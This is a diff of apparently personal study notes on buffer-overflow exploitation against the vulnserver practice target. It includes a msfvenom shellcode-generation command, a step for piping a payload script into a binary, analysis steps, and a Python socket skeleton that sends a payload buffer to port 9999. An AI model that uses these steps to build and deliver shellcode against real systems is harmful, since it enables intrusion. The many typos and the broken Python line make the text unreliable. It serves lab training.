@@ -205,7 +205,42 @@ find registry numer at EIP, input it on wiremask.eu
     0xf7f645fb
     0xf7f6460f
 
+# Remote Exploit
+
+
 RUN FROM OPSTATION msfvenom -p linux/x86/exec CMD=<Command you want to run> -b '\x00' -f python
 get output add to svupr
 
     ./func <<<$(python scwipt.py)
+
+## Step 1 - Static Analysis
+        strings.exe -a -nobanner .\vulserver.exe 
+        strings.exe -a -nobanner .\vulnserver.exe | selesct -first 10
+        strings.exe -a -n 7 -nobanner .\vulnserer.exe 
+
+## Step2 - Behavior Analysis 
+        Run exe as administrator
+        get-process | findstr /i vuln
+        netsetat -anop tcp | findstr <process id>
+
+## Step 3 - Dynamic Anaylsis
+Run Immunity as Administrator
+        Open file > 
+
+
+
+
+
+
+
+
+# Needed Scripts
+        #!/usr/bin/python
+        import socket
+        s = socket.socket (socket.AF_INET, socket.SOCK_STREAM) #create the ipv4 socket, tcp protocol
+        s.connect ((<Your Win OPs ip,9999)) #Connect to target IP and port 
+        print s.recv(1024) #print response
+        s.send(buf) #send the value of buf
+        print s.recv(1024) #print response
+
+        s.close() # Close the Socket
